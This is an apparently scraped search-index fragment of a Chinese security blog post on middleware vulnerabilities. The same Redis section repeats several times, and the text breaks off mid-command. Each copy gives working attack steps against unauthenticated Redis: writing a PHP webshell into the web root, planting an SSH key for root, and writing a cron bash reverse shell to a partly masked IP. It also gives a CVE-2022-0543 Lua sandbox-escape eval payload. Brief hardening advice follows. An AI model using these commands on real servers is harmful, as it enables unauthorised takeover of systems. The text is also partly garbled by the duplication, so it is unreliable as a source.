解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x9-redis"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1未授权访问漏洞"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2redis写入webshell"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#3redis写入ssh公钥登录"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir /var/www/html/ //切换到网站的根目录 config set dbfilename zcc.php //在磁盘中生成木马文件 set xxx \"\\n\\n\\n\u003c?php @eal($_POST['zcc']);?\u003e\\n\\n\\n\" //写入恶意代码到内存中，这里的\\n\\n\\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行. save //将内存中的数据导出到磁盘 3、redis写入ssh公钥登录在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh和默认的缓冲文件authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。 写入公钥的前提： ● Redis服务使用root账号启动 ● 成功连接redis ● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要 将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。 攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可 ssh-keygen -t rsa config set dir /root/.ssh/ config set dbfilename authorized_keys# set x \"\\n\\n\\n公钥\\n\\n\\n\"，将公钥写入x键。前后用\\n换行，避免和Redis里其他缓存数据混合 set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\\n\\n\\n\" save 连接: ssh -i id_rsa root@ip 4、写入计划任务反弹shell原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。 set x \"\\n\\n*/1 * * * * bash -i \u003e\u0026 /dev/tcp/43.xx.x7/8089 0\u003e\u00261\\n\\n\" //\\n为换行符，此处一定要加\\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell config setdir /var/spool/cron config set dbfilename root save 反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。 5、主从复制rce漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。 利用前提: 1.redis 4.x/5.x 2.无需root账号启动redis，普通权限也可以 什么是主从复制? 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis 6、ssrf+redis写入webshell当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。 7、Redis Lua 沙盒绕过rceCVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。 安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。 利用luaopen_io函数，执行代码： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 前提都是需要知道package.loadlib的路径。 8、Redis防御 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1 requirepass设置redis密码，（默认为空） 保护模式开启protected-mode开启（默认开启） 更改默认端口（6379） 避免使用root权限使用 【参考资料】： FreeBuf《Web中间件常见漏洞总结》 CSDN《中间件漏洞汇总》 redis漏洞利用总结 SSRF攻击Redis写入webshell ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:9","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#4写入计划任务反弹shell"},{"categories":["hvv"],"content":"\r0x9 Redisredis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个key-value存储系统。并提供多种语言的API。reids默认端口是6379。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。 1、未授权访问漏洞redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。 漏洞成因 redis为4.x/5.x或以前的版本 redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网 没有设置密码认证，可以免密码远程登录redis服务 漏洞危害 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器 2、redis写入webshellredis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。 config set dir 